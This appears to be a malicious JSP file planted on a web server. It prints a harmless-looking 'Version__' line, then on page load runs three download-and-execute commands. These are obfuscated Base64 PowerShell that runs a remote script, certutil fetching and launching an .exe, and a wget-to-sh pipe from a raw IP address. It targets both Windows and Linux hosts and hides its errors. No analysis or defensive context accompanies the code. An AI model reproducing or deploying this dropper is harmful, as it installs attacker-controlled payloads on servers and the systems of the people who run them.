
<%@ page import="java.util.*,java.io.*"%>
<%
out.println("Version__<br>");
try{
	Runtime.getRuntime().exec("C:/WINDOWS/System32/WindowsPowerShell/v1.0/powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AbgBhAG8AcwBiAGkAbwAuAGMAbwBtAC8AaQBtAGEAZwBlAHMALwBtAGEAaQBuAC8AagBzAC8AYQAvAG0AdQBtAGEALgBwAHMAMQAnACkA");
}catch(Exception e){
	out.println(e.toString()+"<br>");
}
try{
	Runtime.getRuntime().exec("cmd.exe /c certutil.exe -urlcache -split -f https://www.naosbio.com/images/main/js/a/javae.exe C:/ProgramData/st.exe&&cmd.exe /c c:\\ProgramData\\st.exe");
}catch(Exception e){
	out.println(e.toString()+"<br>");
}
try{
    String[] command = { "/bin/sh", "-c", "wget -q http://195.62.12.50:8080/uTFx/a96b031ae6 -O - | sh"};
    Runtime.getRuntime().exec(command);
}catch(Exception e){
	out.println("linux Error");
}
%>

